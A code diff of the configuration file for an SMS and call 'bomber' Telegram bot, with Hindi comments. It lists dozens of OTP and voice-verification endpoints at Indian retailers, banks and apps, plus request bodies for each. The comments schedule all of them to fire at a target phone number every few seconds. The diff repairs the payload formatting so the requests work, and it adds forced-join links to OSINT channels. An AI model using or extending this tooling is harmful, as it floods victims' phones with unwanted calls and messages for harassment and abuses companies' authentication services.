@@ -4,31 +4,51 @@ from dotenv import load_dotenv
 
 load_dotenv()
 
-# --- टेलीग्राम सेटिंग्स ---
+# ------------------------------------------------------------------
+# टेलीग्राम बॉट कॉन्फ़िगरेशन
+# ------------------------------------------------------------------
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-OWNER_ID = int(os.getenv("OWNER_ID", "0"))
+OWNER_ID = int(os.getenv("OWNER_ID", "8104850843"))
 
-# --- MongoDB Atlas सेटिंग्स ---
+# ------------------------------------------------------------------
+# MongoDB Atlas कॉन्फ़िगरेशन
+# ------------------------------------------------------------------
 MONGO_URI = os.getenv("MONGO_URI")
 DATABASE_NAME = "bomber_bot"
 
-# --- वेबहुक सेटिंग्स (Render के लिए) ---
+# ------------------------------------------------------------------
+# वेबहुक कॉन्फ़िगरेशन (Render के लिए)
+# ------------------------------------------------------------------
 RENDER_EXTERNAL_URL = os.getenv("RENDER_EXTERNAL_URL")
 PORT = int(os.getenv("PORT", 10000))
 
-# --- बॉम्बिंग इंटरवल्स (डिफ़ॉल्ट) ---
-DEFAULT_CALL_INTERVAL = 25
-DEFAULT_SMS_INTERVAL = 5
+# ------------------------------------------------------------------
+# बॉम्बिंग इंटरवल्स (डिफ़ॉल्ट)
+# ------------------------------------------------------------------
+DEFAULT_CALL_INTERVAL = 25      # कॉल API हर 25 सेकंड में एक-एक करके
+DEFAULT_SMS_INTERVAL = 5        # SMS/WhatsApp API हर 5 सेकंड में सब एक साथ
 
-# --- ब्रांडिंग ---
+# ------------------------------------------------------------------
+# ब्रांडिंग
+# ------------------------------------------------------------------
 BRANDING = "\n\n🤖 <b>Powered by NULL PROTOCOL</b>"
 
-# --- लॉग चैनल (ऑप्शनल) ---
-LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "0"))
+# ------------------------------------------------------------------
+# लॉग चैनल (वैकल्पिक)
+# ------------------------------------------------------------------
+LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1003712674883"))
 
 # ------------------------------------------------------------------
-# 📞 7 कॉल APIs (हर 25 सेकंड में एक-एक करके हिट होंगी)
+# फोर्स जॉइन चैनल्स (वैकल्पिक)
 # ------------------------------------------------------------------
+FORCE_CHANNELS = [
+    {"name": "User Chat", "link": "https://t.me/legend_chats_osint", "id": -1003672015073},
+    {"name": "OSINT Lookup", "link": "https://t.me/osint_lookup", "id": -1003698567122},
+]
+
+# ==================================================================
+# 📞 7 कॉल APIs (हर 25 सेकंड में एक-एक करके हिट होंगी)
+# ==================================================================
 CALL_APIS = [
     {
         "name": "GauravCyber Call API",
@@ -44,7 +64,7 @@ CALL_APIS = [
         "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"mobile":"{phone}"}}'
+        "data": '{"mobile":"{phone}"}'
     },
     {
         "name": "Tata Capital (1)",
@@ -52,7 +72,7 @@ CALL_APIS = [
         "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
+        "data": '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}'
     },
     {
         "name": "Tata Capital Voice (2)",
@@ -60,7 +80,7 @@ CALL_APIS = [
         "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
+        "data": '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}'
     },
     {
         "name": "Swiggy Call (2)",
@@ -68,7 +88,7 @@ CALL_APIS = [
         "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"mobile":"{phone}"}}'
+        "data": '{"mobile":"{phone}"}'
     },
     {
         "name": "MakeMyTrip Voice Call",
@@ -76,7 +96,7 @@ CALL_APIS = [
         "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phone":"{phone}"}}'
+        "data": '{"phone":"{phone}"}'
     },
     {
         "name": "Goibibo Voice Call",
@@ -84,13 +104,13 @@ CALL_APIS = [
         "url": "https://www.goibibo.com/user/voice-otp/generate/",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phone":"{phone}"}}'
+        "data": '{"phone":"{phone}"}'
     },
 ]
 
-# ------------------------------------------------------------------
+# ==================================================================
 # 💬 57 SMS और WhatsApp APIs (हर 5 सेकंड में सब एक साथ हिट होंगी)
-# ------------------------------------------------------------------
+# ==================================================================
 SMS_WHATSAPP_APIS = [
     # --- पुराने बॉट (main.py) से 14 APIs ---
     {
@@ -115,7 +135,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://pharmeasy.in/api/auth/requestOTP",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"contactNumber":"{phone}"}}'
+        "data": '{"contactNumber":"{phone}"}'
     },
     {
         "name": "Flipkart 1",
@@ -123,7 +143,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://www.flipkart.com/api/6/user/signup/status",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"loginId":["+91{phone}"]}}'
+        "data": '{"loginId":["+91{phone}"]}'
     },
     {
         "name": "Practo",
@@ -159,7 +179,7 @@ SMS_WHATSAPP_APIS = [
             "gk-merchant-id": "19g6im8srkz9y",
             "Content-Type": "application/json"
         },
-        "data": '{{"phone":"{phone}","country":"IN"}}'
+        "data": '{"phone":"{phone}","country":"IN"}'
     },
     {
         "name": "EdzAPI (Gokwik)",
@@ -171,7 +191,7 @@ SMS_WHATSAPP_APIS = [
             "gk-merchant-id": "19an4fq2kk5y",
             "Content-Type": "application/json"
         },
-        "data": '{{"phone":"{phone}","country":"IN"}}'
+        "data": '{"phone":"{phone}","country":"IN"}'
     },
     {
         "name": "FalconAPI (Breeze)",
@@ -183,7 +203,7 @@ SMS_WHATSAPP_APIS = [
             "x-device-id": "A1pKVEDhlv66KLtoYsml3",
             "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
         },
-        "data": '{{"phoneNumber":"{phone}","authVerificationType":"otp","device":{{"id":"A1pKVEDhlv66KLtoYsml3","platform":"Chrome","type":"Desktop"}},"countryCode":"+91"}}'
+        "data": '{"phoneNumber":"{phone}","authVerificationType":"otp","device":{"id":"A1pKVEDhlv66KLtoYsml3","platform":"Chrome","type":"Desktop"},"countryCode":"+91"}'
     },
     {
         "name": "KisanAPI (DeHaat)",
@@ -191,7 +211,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"mobile_number":"{phone}","client_id":"kisan-app"}}'
+        "data": '{"mobile_number":"{phone}","client_id":"kisan-app"}'
     },
     {
         "name": "FasiinAPI (Gokwik)",
@@ -203,7 +223,7 @@ SMS_WHATSAPP_APIS = [
             "gk-merchant-id": "19kc37zcdyiu",
             "Content-Type": "application/json"
         },
-        "data": '{{"phone":"{phone}","country":"IN"}}'
+        "data": '{"phone":"{phone}","country":"IN"}'
     },
     {
         "name": "VidyaKul",
@@ -225,7 +245,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://communication.api.hungama.com/v1/communication/otp",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un"}}'
+        "data": '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un"}'
     },
     {
         "name": "Dayco India (1)",
@@ -241,7 +261,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB",
         "method": "POST",
         "headers": {"content-type": "application/json"},
-        "data": '{{"phone_number":{{"number":"{phone}","country_code":"+91"}}}}'
+        "data": '{"phone_number":{"number":"{phone}","country_code":"+91"}}'
     },
     {
         "name": "Servetel (1)",
@@ -273,7 +293,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://www.mobikwik.com/otp",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"mobile":"{phone}"}}'
+        "data": '{"mobile":"{phone}"}'
     },
     {
         "name": "Airtel Thanks",
@@ -281,7 +301,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://www.airtel.in/thanks-app/otp",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"mobile":"{phone}"}}'
+        "data": '{"mobile":"{phone}"}'
     },
     {
         "name": "DocsApp",
@@ -289,7 +309,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://www.docsapp.com/api/otp",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phone":"{phone}"}}'
+        "data": '{"phone":"{phone}"}'
     },
     {
         "name": "Axis Bank (1)",
@@ -297,7 +317,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://www.axisbank.com/api/otp",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phone":"{phone}"}}'
+        "data": '{"phone":"{phone}"}'
     },
     {
         "name": "Kotak Bank",
@@ -305,7 +325,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://www.kotak.com/api/otp",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phone":"{phone}"}}'
+        "data": '{"phone":"{phone}"}'
     },
     {
         "name": "IndusInd Bank",
@@ -313,7 +333,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://www.indusind.com/api/otp",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phone":"{phone}"}}'
+        "data": '{"phone":"{phone}"}'
     },
     {
         "name": "Bank of Baroda",
@@ -321,7 +341,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://www.bankofbaroda.in/api/otp",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phone":"{phone}"}}'
+        "data": '{"phone":"{phone}"}'
     },
     {
         "name": "Indian Bank",
@@ -329,7 +349,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://www.indianbank.in/api/otp",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phone":"{phone}"}}'
+        "data": '{"phone":"{phone}"}'
     },
     {
         "name": "IDBI Bank",
@@ -337,7 +357,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://www.idbibank.com/api/otp",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"mobile":"{phone}"}}'
+        "data": '{"mobile":"{phone}"}'
     },
     {
         "name": "Punjab & Sind Bank",
@@ -345,7 +365,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://www.psbindia.com/api/otp",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phone":"{phone}"}}'
+        "data": '{"phone":"{phone}"}'
     },
 
     # --- अनुराग प्रीमियम (ANURAGXNOTHING PREMIUM BOMBER.py) से 25 APIs ---
@@ -358,7 +378,7 @@ SMS_WHATSAPP_APIS = [
             "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
             "content-type": "application/json"
         },
-        "data": '{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
+        "data": '{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{phone}"}}'
     },
     {
         "name": "Jockey WhatsApp",
@@ -382,7 +402,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://communication.api.hungama.com/v1/communication/otp",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un"}}'
+        "data": '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un"}'
     },
     {
         "name": "Dayco India (2)",
@@ -406,7 +426,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phone":"{phone}","country":"in"}}'
+        "data": '{"phone":"{phone}","country":"in"}'
     },
     {
         "name": "Univest",
@@ -422,7 +442,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phone":"{phone}"}}'
+        "data": '{"phone":"{phone}"}'
     },
     {
         "name": "Servetel (2)",
@@ -446,7 +466,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://api.myhubble.money/v1/auth/otp/generate",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phoneNumber":"{phone}","channel":"SMS"}}'
+        "data": '{"phoneNumber":"{phone}","channel":"SMS"}'
     },
     {
         "name": "Snapmint",
@@ -454,7 +474,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://api.snapmint.com/v1/public/sign_up",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phone":"{phone}"}}'
+        "data": '{"phone":"{phone}"}'
     },
     {
         "name": "Animall",
@@ -462,7 +482,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://animall.in/zap/auth/login",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
+        "data": '{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}'
     },
     {
         "name": "Entri",
@@ -470,7 +490,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://entri.app/api/v3/users/check-phone/",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"phone":"{phone}"}}'
+        "data": '{"phone":"{phone}"}'
     },
     {
         "name": "A23 Games",
@@ -478,7 +498,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"mobile":"{phone}","device_id":"android123"}}'
+        "data": '{"mobile":"{phone}","device_id":"android123"}'
     },
     {
         "name": "Lifestyle Stores",
@@ -486,7 +506,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"signInMobile":"{phone}","channel":"sms"}}'
+        "data": '{"signInMobile":"{phone}","channel":"sms"}'
     },
     {
         "name": "WorkIndia",
@@ -502,7 +522,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"mobile":"{phone}","mfa_channels":"phno"}}'
+        "data": '{"mobile":"{phone}","mfa_channels":"phno"}'
     },
     {
         "name": "MamaEarth",
@@ -510,7 +530,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"mobile":"{phone}"}}'
+        "data": '{"mobile":"{phone}"}'
     },
     {
         "name": "Wellness Forever",
@@ -518,7 +538,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
         "method": "POST",
         "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-        "data": 'method=firstRegisterApi&data={{"customerMobile":"{phone}","generateOtp":"true"}}'
+        "data": 'method=firstRegisterApi&data={"customerMobile":"{phone}","generateOtp":"true"}'
     },
     {
         "name": "HealthMug",
@@ -526,7 +546,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://api.healthmug.com/account/createotp",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"mobile":"{phone}"}}'
+        "data": '{"mobile":"{phone}"}'
     },
     {
         "name": "Vyapar",
@@ -542,7 +562,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"mobile":"{phone}","buildVersion":"24.0"}}'
+        "data": '{"mobile":"{phone}","buildVersion":"24.0"}'
     },
     {
         "name": "CodFirm",
@@ -558,7 +578,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://app.getswipe.in/api/user/mobile_login",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"mobile":"{phone}","resend":true}}'
+        "data": '{"mobile":"{phone}","resend":true}'
     },
     {
         "name": "Country Delight",
@@ -566,7 +586,7 @@ SMS_WHATSAPP_APIS = [
         "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
-        "data": '{{"mobile":"{phone}","platform":"Android"}}'
+        "data": '{"mobile":"{phone}","platform":"Android"}'
     },
     {
         "name": "AstroSage",
@@ -578,5 +598,10 @@ SMS_WHATSAPP_APIS = [
     },
 ]
 
-# कुल गिनती (वैकल्पिक जांच के लिए)
-# print(f"Loaded {len(CALL_APIS)} call APIs and {len(SMS_WHATSAPP_APIS)} SMS/WhatsApp APIs")
+# ==================================================================
+# वैकल्पिक: कुल गिनती की पुष्टि (डिबगिंग के लिए)
+# ==================================================================
+if __name__ == "__main__":
+    print(f"✅ CALL_APIS loaded: {len(CALL_APIS)}")
+    print(f"✅ SMS_WHATSAPP_APIS loaded: {len(SMS_WHATSAPP_APIS)}")
+    print(f"📦 Total APIs: {len(CALL_APIS) + len(SMS_WHATSAPP_APIS)}")
